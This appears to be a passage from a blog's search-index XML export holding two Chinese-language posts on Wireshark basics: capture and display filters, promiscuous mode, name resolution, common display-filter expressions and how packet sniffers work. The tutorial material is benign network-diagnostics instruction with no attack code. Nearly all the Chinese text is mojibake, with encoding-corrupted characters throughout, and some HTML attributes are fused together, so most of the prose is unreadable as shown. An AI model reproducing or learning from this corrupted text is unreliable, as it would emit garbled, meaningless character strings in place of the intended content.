PacketDetailsï¼ˆæ•°æ®åŒ…è¯¦ç»†åŒºï¼‰ï¼šæ˜¾ç¤ºæ•°æ®åŒ…çš„å†…å®¹ï¼Œå±•å¼€å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…æ•è·çš„å…¨éƒ¨å†…å®¹ã€‚Packet Bytesï¼ˆæ•°æ®åŒ…å­—èŠ‚åŒºï¼‰ï¼šæ˜¾ç¤ºä¸€ä¸ªæ•°æ®åŒ…æœªç»å¤„ç†çš„åŸå§‹æ ·å­ï¼ˆ16è¿›åˆ¶å’Œ ASCII ç å½¢å¼ï¼‰ï¼Œä¹Ÿå°±æ˜¯åœ¨é“¾è·¯ä¸Šä¼ æ’­çš„æ ·å­ã€‚</p><h3 id="æ•è·">æ•è·</h3><ol type="1"><li>æ‰“å¼€é€‰é¡¹ï¼Œé»˜è®¤å¤„åœ¨â€œè¾“å…¥â€é€‰é¡¹å¡</li></ol><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/capture_option1.png" /></p><p>è¿™é‡Œè®²ä¸€ä¸‹ï¼Œè¿‡æ»¤å™¨çš„åˆ†ç±»ï¼šæ•è·è¿‡æ»¤å™¨ä¸æ˜¾ç¤ºè¿‡æ»¤å™¨ã€‚</p><p>å½“ä½ ä½¿ç”¨æŸä¸ªè§„åˆ™è¾ƒå¤šæ—¶ï¼Œå¯ä»¥å°†å…¶åŠ å…¥è§„åˆ™åˆ—è¡¨ï¼Œä»¥ä¾¿åç»­ä½¿ç”¨</p><p>ä¸¤ç§è¿‡æ»¤å™¨çš„ç›®çš„æ˜¯ä¸åŒçš„ã€‚æ•æ‰è¿‡æ»¤å™¨æ˜¯æ•°æ®ç»è¿‡çš„ç¬¬ä¸€å±‚è¿‡æ»¤å™¨ï¼Œå®ƒç”¨äºæ§åˆ¶æ•æ‰æ•°æ®çš„æ•°é‡ï¼Œä»¥é¿å…äº§ç”Ÿè¿‡å¤§çš„æ—¥å¿—æ–‡ä»¶ã€‚ä¸€èˆ¬åœ¨æµé‡æ¯”è¾ƒå¤§çš„ç½‘ç»œä¸­ï¼Œä½¿ç”¨å®ƒå¯ä»¥é¿å…æŠ“åˆ°å¤ªå¤šä½ ä¸éœ€è¦çš„åŒ…ï¼Œä½¿Wireshark å¡æ­»ç­‰ï¼Œå°çš„ä¹Ÿå¯ä»¥ç”¨ emmã€‚æ˜¾ç¤ºè¿‡æ»¤å™¨æ˜¯ä¸€ç§æ›´ä¸ºå¼ºå¤§ï¼ˆå¤æ‚ï¼‰çš„è¿‡æ»¤å™¨ã€‚å®ƒå…è®¸æ‚¨åœ¨æ—¥å¿—æ–‡ä»¶ä¸­è¿…é€Ÿå‡†ç¡®åœ°æ‰¾åˆ°æ‰€éœ€è¦çš„è®°å½•ã€‚å³ï¼šä»ä½ æŠ“å–çš„åŒ…ä¸­é€‰æ‹©å“ªäº›åŒ…è¦æ˜¾ç¤ºåœ¨ç•Œé¢ä¸Šï¼Œå“ªäº›åŒ…ä¸æ˜¾ç¤ºã€‚</p><p>ä½ åœ¨ä¸»ç•Œé¢çœ‹åˆ°çš„æ•°æ®æŠ¥è¿‡æ»¤æ æ˜¯æ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œä½ åœ¨æ•è·é€‰é¡¹ä¸­çœ‹åˆ°çš„â€œæ•è·è¿‡æ»¤å™¨â€ä»¥åŠæ‰“å¼€é€‰é¡¹åçœ‹åˆ°çš„â€œæ‰€é€‰æ‹©æ¥å£çš„æ•è·è¿‡æ»¤å™¨â€éƒ½æ˜¯æŒ‡æ•è·è¿‡æ»¤å™¨ã€‚</p><p>ä¸¤ç§è¿‡æ»¤å™¨ä½¿ç”¨çš„è¯­æ³•æ˜¯å®Œå…¨ä¸åŒçš„ã€‚</p><p>æ³¨æ„ï¼šä¸¤ç§è¿‡æ»¤å™¨è¯­æ³•æ˜¯æœ‰äº›ä¸ç›¸åŒçš„ï¼Œä½†æ˜¯å¦‚æœä½ å­¦è¿‡ä»»ä½•ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œç›¸ä¿¡ä½ ä¼šå¾ˆå®¹æ˜“ä¸Šæ‰‹è¿™ä¸ªï¼Œä¸‹é¢ç»™å‡ºé“¾æ¥ï¼š<ahref="https://wiki.wireshark.org/CaptureFilters">æ•è·è¿‡æ»¤å™¨è¯­æ³•</a>ã€<ahref="https://wiki.wireshark.org/DisplayFilters">æ˜¾ç¤ºè¿‡æ»¤å™¨è¯­æ³•</a></p><p>æ¥ç€è®²ä¸Šé¢çš„ç•Œé¢ï¼Œâ€œåœ¨æ‰€æœ‰æ¥å£ä¸Šä½¿ç”¨æ··æ‚æ¨¡å¼â€æ˜¯æŒ‡ä¸€å°æœºå™¨çš„ç½‘å¡èƒ½å¤Ÿæ¥æ”¶æ‰€æœ‰ç»è¿‡å®ƒçš„æ•°æ®æµï¼Œè€Œä¸è®ºå…¶ç›®çš„åœ°å€æ˜¯å¦æ˜¯å®ƒã€‚è€Œéæ··æ‚æ¨¡å¼ï¼Œåˆ™åªæ¥å—MAC åœ°å€ä¸ºè‡ªå·±çš„æ•°æ®æµã€‚ä¸€èˆ¬å¼€å¯å®ƒã€‚</p><p>å¯ä»¥åœ¨è¿™å¡«å†™æ•è·è¿‡æ»¤è¯­å¥ï¼ˆè¯­æ³•æ­£ç¡®ä¼šæ˜¾ç¤ºç»¿è‰²ï¼Œé”™è¯¯æ˜¾ç¤ºçº¢è‰²ï¼‰ï¼Œç„¶åç‚¹å‡»ç¡®å®šï¼Œå¼€å§‹æ•è·ç¬¦åˆä½ è¯­æ³•çš„åŒ…ã€‚</p><p>2ï¼‰ä¸‹é¢çœ‹çœ‹â€œé€‰é¡¹â€é€‰é¡¹å¡ï¼Œè¾“å‡ºé€‰é¡¹å¡è‡ªå·±è¯•è¯•ï¼Œæ¯”è¾ƒç®€å•</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/capture_option3.png"alt="é€‰é¡¹" /><figcaption aria-hidden="true">é€‰é¡¹</figcaption></figure><p>æ˜¾ç¤ºé€‰é¡¹ï¼š</p><ol type="1"><li>å®æ—¶æ›´æ–°åˆ†ç»„åˆ—è¡¨ï¼šWiresharkæŠ“åŒ…ä¸»çª—å£ä¼šå®æ—¶æ˜¾ç¤ºæŠ“å–åˆ°çš„æ‰€æœ‰æ•°æ®åŒ…</li><li>å®æ—¶æ•è·è‡ªåŠ¨æ»šå±ï¼šWireshark æŠ“åŒ…ä¸»çª—å£ä¼šåœ¨å®æ—¶æŠ“å–æ•°æ®åŒ…æ—¶æ»šåŠ¨</li><li>å®æ—¶æ•è·æœŸé—´æ˜¾ç¤ºæ•è·ä¿¡æ¯ï¼šé€‰ä¸­ä¹‹åï¼Œç‚¹å‡»ç¡®è®¤ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªæ˜¾ç¤ºå„åè®®ï¼ˆICMPï¼ŒTCPï¼ŒIPï¼ŒUDPï¼Œå…¶ä»–ï¼‰æµé‡æ³¢åŠ¨çš„çº¿æ€§æ³¢åŠ¨å›¾ï¼Œå¯ä»¥åœ¨æ•è·çš„åŒæ—¶ï¼Œçœ‹å„åè®®å¤§ä½“è¶‹åŠ¿ã€‚</li></ol><p>è§£æåç§°ï¼š</p><ol type="1"><li>è§£æ MAC åœ°å€å°±æ˜¯è§£æå…¶æ‰€éš¶å±çš„å‚å•†å</li><li>è§£æç½‘ç»œåç§°ï¼Œå°±æ˜¯è§£æ IP å‘å¯¹åº”çš„ä¸»æœºå / åŸŸåï¼Œwiresharkä¼šå‘å¤§é‡çš„ DNS è¯·æ±‚ï¼ˆå‘ wireshark æ‰€åœ¨ä¸»æœºçš„DNSï¼‰å»è§£æç½‘ç»œåç§°ï¼Œå› æ­¤å¦‚æœç½‘ç»œè¾ƒå¤§ï¼Œä¼šè€—è´¹å¤§é‡ç³»ç»Ÿèµ„æºã€‚</li><li>è§£æä¼ è¾“å±‚åç§°ï¼šè§£æ TCP/UDP ç«¯å£å·ç›¸å¯¹åº”çš„åº”ç”¨ç¨‹åºå</li></ol><h2 id="å¸¸ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨è¿‡æ»¤å‘½ä»¤">å¸¸ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨è¿‡æ»¤å‘½ä»¤</h2><ol type="1"><li><p>æ ¹æ®åè®®è¿‡æ»¤ <code>dnsï¼Œtcpï¼Œupdï¼Œarp</code> ç­‰</p></li><li><p>æ ¹æ®æºã€ç›®çš„ IP è¿‡æ»¤ <code>ip.src==</code><code>ip.dst==</code></p></li><li><p>æ ¹æ®ç«¯å£è¿‡æ»¤ <code>tcp.port == 80</code> æºã€ç›®çš„ç«¯å£ä¸º 80 çš„ tcp<code>tcp.srcport==80</code> åªçœ‹æºç«¯å£ä¸º 80 çš„ tcp<code>udp.port == 53</code> dns æ•°æ®åŒ…</p></li><li><p>é€»è¾‘è¡¨è¾¾å¼ and or xor not</p></li></ol><h3 id="ç»Ÿè®¡">ç»Ÿè®¡</h3><p>æ˜¯å¾ˆé‡è¦çš„æ¨¡å—ï¼Œå•ç‹¬æ‹¿ä¸€ç¯‡æ–‡ç« è®²ä¸€ä¸‹</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/28771785">å›¾è§£ ARPåè®®ï¼ˆä¸€ï¼‰</a></li></ul></blockquote><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/28818627">å›¾è§£ ARPåè®®ï¼ˆäºŒï¼‰ARP æ”»å‡»ç¯‡</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
            <tag> æŠ“åŒ… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é›¶. æ•°æ®åŒ…åˆ†æä¸ç½‘ç»œåŸºç¡€</title>
      <link href="/blog/2019/06/30/wireshark/packets_and_network_basis/"/>
      <url>/blog/2019/06/30/wireshark/packets_and_network_basis/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®åŒ…åˆ†ææŠ€æœ¯ä¸ç½‘ç»œåŸºç¡€">æ•°æ®åŒ…åˆ†ææŠ€æœ¯ä¸ç½‘ç»œåŸºç¡€</h1><h2 id="æ•°æ®åŒ…åˆ†ææŠ€æœ¯">æ•°æ®åŒ…åˆ†ææŠ€æœ¯</h2><ol type="1"><li>æ•°æ®åŒ…åˆ†ææŠ€æœ¯æ˜¯ç”¨æ¥è§£å†³<strong>æ‰€æœ‰</strong>ç½‘ç»œé—®é¢˜çš„æŠ€æœ¯</li><li>æ‰€æœ‰ç½‘ç»œé—®é¢˜éƒ½æºäº â€œæ•°æ®åŒ…å±‚æ¬¡â€</li><li>å¯ä»¥è§£å†³ç½‘ç»œé€šä¿¡é€Ÿåº¦æ…¢çš„é—®é¢˜ï¼Œå¯ä»¥è¯†åˆ«åº”ç”¨ç¨‹åºçš„æ€§èƒ½ç“¶é¢ˆ</li><li>å¯ä»¥åœ¨çœŸå®ç¯å¢ƒä¸­è¿½è¸ªé»‘å®¢</li></ol><h2 id="æ•°æ®åŒ…æŠ“å–å·¥å…·å—…æ¢å™¨">æ•°æ®åŒ…æŠ“å–å·¥å…·ï¼ˆå—…æ¢å™¨ï¼‰</h2><p>åˆ†ä¸ºå…è´¹çš„å’Œå•†ä¸šçš„ï¼Œæµè¡Œçš„åˆ†æè½¯ä»¶åŒ…æ‹¬ tcpdumpï¼ŒOmniPeek å’ŒWiresharkï¼Œå…¶ä¸­ tcpdump æ˜¯å‘½ä»¤è¡Œå·¥å…·ï¼Œå¦å¤–ä¸¤æ¬¾å‡æ‹¥æœ‰å›¾å½¢åŒ–ç•Œé¢ã€‚</p><p>æ•°æ®åŒ…å—…æ¢çš„å·¥ä½œåŸç†ï¼š</p><p>ç½‘ç»œå—…æ¢å™¨çš„å·¥ä½œåŸç†</p><ol type="1"><li><p>æ”¶é›†</p><p>æ•°æ®åŒ…å—…æ¢å™¨ä»ç½‘ç»œçº¿ç¼†ä¸Šæ”¶é›†åŸå§‹äºŒè¿›åˆ¶æ•°æ®ã€‚<em>é€šå¸¸æƒ…å†µä¸‹ï¼Œé€šè¿‡å°†é€‰å®šçš„ç½‘å¡è®¾ç½®æˆæ··æ‚æ¨¡å¼æ¥å®ŒæˆæŠ“åŒ…ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œç½‘å¡å°†æŠ“å–ä¸€ä¸ªç½‘æ®µä¸Šæ‰€æœ‰çš„ç½‘ç»œé€šä¿¡æµé‡ï¼Œè€Œä¸ä»…æ˜¯å‘å¾€å®ƒçš„æ•°æ®åŒ…ã€‚</em></p></li><li><p>è½¬æ¢</p><p>å°†æ•è·çš„äºŒè¿›åˆ¶æ•°æ®è½¬æ¢æˆå¯è¯»å½¢å¼ã€‚é«˜çº§çš„å‘½ä»¤è¡Œæ•°æ®åŒ…å—…æ¢å™¨å°±æ”¯æŒåˆ°è¿™ä¸€æ­¥éª¤ã€‚åˆ°è¿™æ­¥ï¼Œç½‘ç»œä¸Šçš„æ•°æ®åŒ…å°†ä»¥ä¸€ç§éå¸¸åŸºç¡€çš„è§£ææ–¹å¼è¿›è¡Œæ˜¾ç¤ºï¼Œè€Œå°†å¤§éƒ¨åˆ†çš„åˆ†æå·¥ä½œç•™ç»™æœ€ç»ˆç”¨æˆ·ã€‚</p></li><li><p>åˆ†æ</p><p>å¯¹æ•è·å’Œè½¬æ¢åçš„æ•°æ®è¿›è¡ŒçœŸæ­£çš„æ·±å…¥åˆ†æã€‚æ•°æ®åŒ…å—…æ¢å™¨ä»¥æ•è·çš„ç½‘ç»œæ•°æ®ä½œä¸ºè¾“å…¥ï¼Œè¯†åˆ«å’ŒéªŒè¯å®ƒä»¬çš„åè®®ï¼Œç„¶åå¼€å§‹åˆ†ææ¯ä¸ªåè®®ç‰¹å®šçš„å±æ€§ã€‚</p></li></ol><p>åœ¨è¿™é‡Œæˆ‘ä»¬å†å¤ä¹ ä¸€ä¸‹è®¡ç®—æœºç½‘ç»œçš„ä¸€äº›çŸ¥è¯†ï¼š</p><ol type="1"><li><ahref="https://realyee.github.io/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E4%B8%8E%E4%B8%A4%E7%A7%8D%E5%86%B2%E7%AA%81%E5%9F%9F/">OSIæ¨¡å‹ã€é›†çº¿å™¨ã€è·¯ç”±å™¨ã€äº¤æ¢æœºã€å†²çªåŸŸã€å¹¿æ’­åŸŸä»¥åŠå¸§çš„å°è£…ä¸è§£å°è£…</a></li><li><ahref="https://blog.csdn.net/freestyle4568world/article/details/50609435">å¹¿æ’­ã€å¤šæ’­ã€å•æ’­</a></li></ol><p>æœªå®Œå¾…ç»­...</p>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€ </tag>
            
            <tag> æŠ“åŒ… </tag>
            
            <tag> è®¡ç®—æœºç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
